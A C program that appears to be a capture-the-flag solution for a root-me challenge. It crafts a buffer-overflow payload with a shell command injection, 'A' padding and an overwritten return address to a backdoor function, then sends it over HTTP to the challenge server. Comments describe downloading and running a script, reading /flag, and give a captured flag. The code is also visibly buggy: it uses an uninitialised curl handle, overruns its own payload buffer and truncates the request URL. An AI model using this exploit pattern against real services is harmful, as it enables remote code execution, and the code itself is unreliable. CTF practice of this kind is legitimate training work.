#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <unistd.h>

#define MAX_PAYLOAD_SIZE 72 //payload can't outpass 72 because the bof requires 72 chars 
 
unsigned char laluBackdoor_address[] = { 0x91, 0xeb, 0x61, 0x00 }; //little endian

int sendPayload(const char* payload) {
    CURL *curl;
    CURLcode res;
    char url[MAX_PAYLOAD_SIZE];
    //for url encoding/special chars
    char* escapedPayload = curl_easy_escape(curl, payload, 0);
    if (escapedPayload) {
    	//print formated string
        snprintf(url, sizeof(url), "http://dyn-01.xmas.root-me.org:26128/?gown=%s", escapedPayload);
        curl = curl_easy_init();
        if(curl) {
            curl_easy_setopt(curl, CURLOPT_URL, url);
            curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
            res = curl_easy_perform(curl);
            curl_easy_cleanup(curl);
        }
        curl_free(escapedPayload);
    }
    return 0;
}

void craftPayload(char* payload) {
    char* p = "./exploit2.sh ; "; //wget exploit2.sh , chmod +x , ./exploit2.sh flag :RM{OffenSkillSaysWhat2024YouGotGowned}
    strcpy(payload, p); //ls / ; cat /flag; / ls /flag
    int y = 72 - strlen(p);
    memset(payload + strlen(p), 'A', y ); // 72*A to overflow
    memcpy(payload + strlen(p) + y, laluBackdoor_address, sizeof(laluBackdoor_address));
    payload[strlen(p) + y + sizeof(laluBackdoor_address)] = '\0';
}

int main() {
    char payload[MAX_PAYLOAD_SIZE];
    craftPayload(payload);
    int result = sendPayload(payload);
    if (result == -1) {
        fprintf(stderr, "[x] Error\n");
        return 1;
    }
    printf("[+] Payload sent : %s\n", payload);
    return 0;
}
